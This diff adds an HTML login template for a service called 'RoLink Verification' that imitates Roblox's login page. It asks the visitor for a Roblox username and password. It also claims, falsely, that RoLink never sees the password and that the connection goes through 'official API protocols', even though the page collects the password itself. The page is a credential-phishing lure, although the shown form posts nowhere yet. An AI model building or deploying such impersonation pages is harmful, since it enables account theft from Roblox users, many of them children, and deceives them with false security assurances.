@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login | RoLink Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            margin: 0; 
+            background-color: #f7f7f7; /* Roblox light grey bg */
+            display: flex; flex-direction: column; min-height: 100vh;
+        }
+        .login-container {
+            background: white;
+            width: 100%; max-width: 400px;
+            margin: 60px auto;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        h2 { color: #393b3d; font-size: 24px; margin-bottom: 20px; }
+        .user-tag { 
+            background: #e3e4e4; padding: 10px; 
+            border-radius: 4px; margin-bottom: 25px;
+            font-weight: 600; color: #4b4d4e;
+        }
+        input {
+            width: 100%; padding: 12px;
+            margin-bottom: 15px; border: 1px solid #b8b9ba;
+            border-radius: 4px; box-sizing: border-box;
+            background: #f2f4f5;
+        }
+        .btn-login {
+            width: 100%; background-color: #0084ff;
+            color: white; border: none; padding: 12px;
+            font-weight: 700; border-radius: 4px; cursor: pointer;
+        }
+        .footer-note { font-size: 12px; color: #656667; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login to Roblox</h2>
+        <div class="user-tag">Verifying as: {{ username }}</div>
+        <form action="#">
+            <input type="text" placeholder="Username/Email/Phone" value="{{ username }}">
+            <input type="password" placeholder="Password">
+            <button type="submit" class="btn-login">Log In</button>
+        </form>
+        <p class="footer-note">RoLink will never see your password. This connection is encrypted via official API protocols.</p>
+    </div>
+</body>
+</html>
